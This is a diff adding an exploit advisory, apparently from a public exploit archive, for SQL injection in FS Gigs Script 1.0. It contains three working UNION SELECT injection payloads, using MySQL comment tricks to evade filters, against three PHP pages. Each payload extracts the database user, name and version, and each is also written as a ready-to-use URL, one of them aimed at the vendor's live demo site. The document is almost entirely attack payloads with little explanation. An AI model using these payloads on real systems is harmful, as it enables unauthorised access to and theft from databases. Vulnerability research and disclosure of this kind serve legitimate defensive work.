@@ -1,0 +1,43 @@
+# # # # # 
+# Exploit Title: FS Gigs Script 1.0 - SQL Injection
+# Dork: N/A
+# Date: 08.12.2017
+# Vendor Homepage: https://fortunescripts.com/
+# Software Link: https://fortunescripts.com/product/gigs-script/
+# Demo: http://gigs.demonstration.co.in/
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# 1)
+# http://localhost/[PATH]/browse-category.php?cat=[SQL]
+# 
+# -83c4ca4238a0b923820dcc509a6f75849b'++/*!50000UNION*/+/*!50000SELECT*/+1,CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()),3,4,5--+-
+# 
+# http://server/browse-category.php?cat=-83c4ca4238a0b923820dcc509a6f75849b'++/*!50000UNION*/+/*!50000SELECT*/+1,CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()),3,4,5--+-
+# 
+# 2)
+# http://localhost/[PATH]/browse-scategory.php?sc=[SQL]
+# 
+# -53c81e728d9d4c2f636f067f89cc14862c'++UNION(SELECT(1),(2),(3),(4),(5),(6),CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()),(8),(9),(10))--+-
+# 
+# http://server/browse-scategory.php?sc=-53c81e728d9d4c2f636f067f89cc14862c'++UNION(SELECT(1),(2),(3),(4),(5),(6),CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()),(8),(9),(10))--+-
+# 
+# 3)
+# http://localhost/[PATH]/service-provider.php?ser=[SQL]
+# 
+# -1873'+UNION(SELECT(1),(2),(3),(4),(5),(6),CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()),(8),(9),(10),(11),(12),(13),(14),(15),(16),(17),(18),(19),(20),(21),(22),(23),(24),(25),(26),(27),(28),(29),(30),(31),(32),(33),(34),(35),(36),(37),(38),(39),(40),(41),(42),(43),(44),(45),(46),(47),(48),(49),(50),(51),(52))--+-
+# 
+# http://gigs.demonstration.co.in/service-provider.php?ser=-1873'+UNION(SELECT(1),(2),(3),(4),(5),(6),CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()),(8),(9),(10),(11),(12),(13),(14),(15),(16),(17),(18),(19),(20),(21),(22),(23),(24),(25),(26),(27),(28),(29),(30),(31),(32),(33),(34),(35),(36),(37),(38),(39),(40),(41),(42),(43),(44),(45),(46),(47),(48),(49),(50),(51),(52))--+-
+# 
+# # # # #
